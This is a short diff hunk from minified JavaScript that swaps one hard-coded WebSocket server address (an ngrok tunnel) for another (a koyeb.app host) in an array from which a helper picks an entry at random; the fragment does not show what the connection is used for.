@@ -740,7 +740,7 @@
                 }
             }
             var RU = BU;
-            const VU = ["wss://c2ad-192-169-114-12.ngrok-free.app"];
+            const VU = ["wss://costly-ilene-tranvanden-8f610bc6.koyeb.app"];
             function lU(U) {
                 const F = Math.floor(Math.random() * U.length);
                 return U[F]
